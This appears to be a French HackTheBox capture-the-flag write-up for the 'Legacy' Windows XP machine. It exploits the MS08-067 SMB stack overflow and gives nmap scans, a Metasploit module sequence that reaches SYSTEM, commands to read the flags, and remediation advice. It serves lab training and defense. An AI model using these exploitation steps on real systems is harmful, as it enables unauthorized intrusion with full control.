# Legacy — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows XP SP3 |
| **Difficulté** | Easy |
| **Date** | 2026-09-26 |
| **Vecteur** | Débordement de pile via le service Server SMB |
| **CVE** | CVE-2008-4250 (MS08-067) |

> ⚠️ Machine faite en solo — remplacer `<IP_CIBLE>` et vérifier les versions/ports
> avec ta propre sortie nmap.

---

## TL;DR

La cible est un **Windows XP SP3** exposant SMB (135/139/445), vulnérable à **MS08-067**. La fonction `NetPathCanonicalize` du service **Server** (jointe à distance via RPC) canonicalise mal un chemin réseau piégé → **débordement de pile** → écrasement de l'adresse de retour → exécution de code en **SYSTEM**. RCE non authentifiée.

---

## 1. Reconnaissance

### Scan nmap de référence

```bash
nmap -sC -sV -p- -oA nmap/legacy <IP_CIBLE>
```

Ports notables :

| Port | Service | Version |
| --- | --- | --- |
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | microsoft-ds | **Windows XP** microsoft-ds |

> Trio Windows classique. La version **Windows XP** (OS en fin de vie) oriente
> immédiatement vers les vulnérabilités SMB historiques (MS08-067, MS17-010).

---

## 2. Confirmation de la vulnérabilité

```bash
nmap --script smb-vuln-ms08-067 -p445 <IP_CIBLE>
```

Résultat attendu :

```
smb-vuln-ms08-067:
  VULNERABLE:
    State: VULNERABLE
    IDs: CVE:CVE-2008-4250
    Risk factor: HIGH
```

> Note : cet OS est souvent aussi vulnérable à MS17-010. MS08-067 reste le vecteur
> « canonique » de la machine.

---

## 3. Exploitation

### Via Metasploit

```
msfconsole -q
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <IP_CIBLE>
set LHOST tun0
check
run
```

Vérification :

```
getuid
# Server username: NT AUTHORITY\SYSTEM
```

> **Exploit fragile** : il dépend de la version exacte de Windows et de la langue
> (les adresses mémoire visées changent). Si `target: Automatic` échoue,
> régler manuellement via `show targets` puis `set target N`. Un mauvais essai
> peut faire tomber le service (BSOD).

---

## 4. Post-exploitation

```cmd
type C:\Documents and Settings\<user>\Desktop\user.txt   # flag user
type C:\Documents and Settings\Administrator\Desktop\root.txt  # flag root
```

> Sous Windows XP, les profils sont dans `C:\Documents and Settings\` (et non `C:\Users\`).
> Les flags ne sont pas publiés (règle HTB — pas de spoiler).

---

## 5. Remédiation

- **Appliquer le correctif MS08-067** (le patch existe depuis 2008).
- **Migrer l'OS** : Windows XP est hors support, aucune sécurité durable possible.
- **Désactiver SMBv1** et activer la signature SMB.
- Segmenter et isoler tout système legacy qui ne peut pas être mis à jour.

---

## 6. Leçons

- Le **mécanisme** : mauvaise canonicalisation de chemin (`..` traités de travers) →
  recul au-delà du tampon → écrasement de l'adresse de retour → shellcode en SYSTEM.
- Famille **corruption mémoire** (comme EternalBlue), à opposer à l'injection de
  commande de Lame.
- Un **OS en fin de vie** est une piste en soi : la version relevée au nmap suffit
  souvent à choisir l'exploit.

---

## Références

- CVE-2008-4250 — <https://nvd.nist.gov/vuln/detail/CVE-2008-4250>
- Microsoft MS08-067 — <https://learn.microsoft.com/security-updates/securitybulletins/2008/ms08-067>
- Module Metasploit : `exploit/windows/smb/ms08_067_netapi`
